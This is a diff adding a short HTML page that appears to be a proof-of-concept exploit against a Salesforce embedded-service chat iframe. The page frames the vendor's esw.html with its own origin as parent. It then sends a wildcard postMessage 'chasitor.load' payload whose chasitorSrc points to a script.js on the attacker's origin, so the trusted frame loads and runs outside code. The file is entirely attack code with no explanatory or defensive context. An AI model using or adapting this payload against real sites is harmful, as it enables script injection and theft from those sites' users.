@@ -1,0 +1,26 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+  <script>
+   window.onload = function () {
+   	var parent_location = window.origin;
+   	var iframe_src = "https://instance.salesforce.com/embeddedservice/2.1/esw.html?parent=" + parent_location;
+   	document.getElementById("frame").src = iframe_src;
+   	setTimeout(function () {
+   		var payload = {};
+   		payload.method = "chasitor.load";
+   		payload.domain = document.domain;
+   		payload.data = {};
+   		payload.data.settingsObj = {};
+   		payload.data.settingsObj.chasitorSrc = parent_location + "/script.js";
+   		frames[0].postMessage(payload, "*");
+   	}, 4000);
+   }
+  </script>    
+  </head>
+  <body>
+     <iframe id="frame" src="about:blank" width=500 height=400></iframe>
+  </body>
+</html>
+
